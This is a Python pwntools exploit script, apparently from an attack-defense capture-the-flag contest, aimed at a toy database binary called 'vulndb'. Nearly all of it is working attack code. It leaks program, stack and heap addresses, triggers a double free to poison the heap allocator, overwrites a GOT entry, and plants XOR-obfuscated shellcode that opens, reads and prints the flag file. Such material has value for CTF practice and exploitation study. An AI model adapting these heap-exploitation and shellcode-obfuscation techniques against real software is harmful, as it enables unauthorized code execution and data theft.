#! /usr/bin/env python3
from pwn import *

binary = '060-round-072-team-0-ad-2-80a65f4cadfa13b3f3b6d127fa501514'
binary = '056-round-065-team-1-ad-2-80a65f4cadfa13b3f3b6d127fa501514'
binary = '068-round-091-team-2-ad-2-80a65f4cadfa13b3f3b6d127fa501514'
binary = '055-round-050-team-3-ad-2-80a65f4cadfa13b3f3b6d127fa501514'
binary = '067-round-090-team-5-ad-2-a772da960928cf64907fd225f60140be'
binary = 'vulndb_patched2'
context.arch = 'amd64'
context.terminal = ['tmux', 'neww']

def create_db(name):
    r.sendlineafter('>>', 'Create db')
    r.sendafter('name:', name)
    print(r.recvline())

def delete_db(idx):
    r.sendlineafter('>>', 'Delete db')
    r.sendlineafter('id:', str(idx))

def select_db(idx):
    r.sendlineafter('>>', 'Select db')
    r.sendlineafter('id:', str(idx))

# TODO more = 'yes'
def create_table(tb_name, col_name, col_type, more='no'):
    r.sendlineafter('>>', 'Create table')
    r.sendafter('Table name:', tb_name)
    r.sendafter('Column name:', col_name)
    r.sendlineafter(':', str(col_type))
    r.sendlineafter('?', more)

def Drop_table(name):
    r.sendlineafter('>>', 'Drop table')
    r.sendlineafter('name:', name)
    print(r.recvline())

def insert(tb_name, data=''):
    r.sendlineafter('>>', 'Insert')
    r.sendafter('name:', tb_name)
    query = r.recvuntil(':', timeout=1).decode()
    if(query[1] == '[' and query[-1] == ':'):
        print(query)
        r.sendline(data)

def select_all(tb_name):
    r.sendlineafter('>>', 'Select all')
    r.sendlineafter('name:', tb_name)

def select(tb_name, row_id):
    r.sendlineafter('>>', 'Select')
    r.sendlineafter('name:', tb_name)
    r.sendlineafter('id:', str(row_id))
    print(r.recvuntil('[')[:-1])

def delete(tb_name, row_id):
    r.sendlineafter('>>', 'Delete')
    r.sendafter('name:', tb_name)
    r.sendlineafter('id:', str(row_id))

def update(tb_name, row_id, data):
    r.sendlineafter('>>', 'Update')
    r.sendafter('name:', tb_name)
    r.sendlineafter('id:', str(row_id))
    r.sendafter(':', str(data))

def develop_mode(token='', data=''):
    r.sendlineafter('>>', 'developer mode')
    r.sendafter(':', token)
    if len(data):
        print(r.recvline())
        r.sendline(data)

def disconnect():
    r.sendlineafter('>>', 'Disconnect')
    print(r.recvline())

r = process(binary, env={"LD_LIBRARY_PATH":"."})
#input('>')
r.sendafter('>>', 'a'*0x7+'x')
r.recvuntil('x')
pie_base = u64(r.recvline().strip()+b'\x00'*2) - 0x1360
print("pie_base @ ", hex(pie_base))

r.sendafter('>>', 'a'*0xf+'x')
r.recvuntil('x')
stack = u64(r.recvline().strip()+b'\x00'*2)
print("stack @ ", hex(stack))

# leak heap

create_db('db0')
create_db('db1')
delete_db(0)
delete_db(1)
select_db(1)
r.recvuntil(b'[db:')
heap_base = u64(r.recvuntil(b']', drop=True).ljust(8, b'\0')) - 0x2a0
log.info('heap: {:#x}'.format(heap_base))


create_db('db2')
create_db('db3')
create_db('db4')

select_db(2)
create_table('/home/vulndb/flag', 'c'*0xf, 3)
for i in range(7):
    insert('/home/vulndb/flag', '123')

for i in range(7):
    delete('/home/vulndb/flag', 0)

# double free to fasbin
delete_db(3)
delete_db(4)
delete_db(3)


for i in range(7):
    insert('/home/vulndb/flag', '123')

sleep_got = pie_base + 0x60d8
insert('/home/vulndb/flag', p64(sleep_got))


flagstr = heap_base + 768
xor_pat = 0x5a5a5a5a5a5a5a5a
xor_flagstr = xor_pat ^ flagstr
shellcode = asm('''
    mov rdi, ''' + str(xor_flagstr) + '''
    mov rsi, ''' + str(xor_pat) + '''
    xor rdi, rsi
    xor rsi, rsi
    xor rdx, rdx
    xor rax, rax
    xor al, 2
    syscall
    mov r9, rax
    mov rdi, rax
    mov rsi, ''' + str(xor_flagstr) + '''
    mov rdx, ''' + str(xor_pat) + '''
    xor rsi, rdx
    mov rdx, ''' + str(400 ^ xor_pat) + '''
    mov r8, ''' + str(xor_pat) + '''
    xor rdx, r8
    xor rax, rax
    syscall
    xor rdi, rdi
    inc rdi
    mov rsi, ''' + str(xor_flagstr) + '''
    mov rdx, ''' + str(xor_pat) + '''
    xor rsi, rdx
    mov rdx, ''' + str(400 ^ xor_pat) + '''
    mov r8, ''' + str(xor_pat) + '''
    xor rdx, r8
    xor rax, rax
    inc rax
    syscall
''')
payload = shellcode + b'/home/vulndb/flag'

insert('/home/vulndb/flag', payload.ljust(0x100, b'a'))
target = heap_base + 0x1b30
insert('/home/vulndb/flag', 'a')
insert('/home/vulndb/flag', 'a')
insert('/home/vulndb/flag', payload)
insert('/home/vulndb/flag', p64(target))

#gdb.attach(r)
select_db(2)

r.interactive()
